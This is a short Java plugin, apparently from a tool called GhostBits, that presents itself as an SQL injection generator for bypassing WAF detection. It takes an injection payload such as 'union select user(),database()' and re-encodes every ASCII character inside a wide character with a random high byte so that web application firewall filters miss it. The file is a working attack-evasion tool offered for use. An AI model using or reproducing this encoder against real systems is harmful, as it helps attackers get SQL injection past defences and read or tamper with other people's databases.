import java.util.Random;

public class GhostBitsDemoPlugin implements com.ghostbits.plugins.Plugin {
    
    private Random random = new Random();
    
    public String getName() {
        return "GhostBits SQL注入生成器";
    }
    
    public String getVersion() {
        return "1.0.0";
    }
    
    public String getAuthor() {
        return "xstteam";
    }
    
    public String getDescription() {
        return "将普通SQL注入Payload转换为GhostBits格式，绕过WAF检测";
    }
    
    public String getExampleInput() {
        return "示例: union select user(),database()";
    }
    
    public String execute(String input) {
        if (input == null || input.trim().isEmpty()) {
            return "错误: 输入不能为空\n\n示例: union select user()";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("========== GhostBits Payload ==========\n");
        result.append("原始: ").append(input.trim()).append("\n");
        result.append("转换: ").append(convertToGhost(input.trim())).append("\n");
        result.append("========================================\n");
        
        return result.toString();
    }
    
    private String convertToGhost(String plain) {
        StringBuilder sb = new StringBuilder();
        int highByte = 0xB0 + random.nextInt(0x28);
        for (char c : plain.toCharArray()) {
            if (c < 128) {
                sb.append((char) ((highByte << 8) | (c & 0xFF)));
            } else {
                sb.append(c);
            }
        }
        return sb.toString();
    }
}
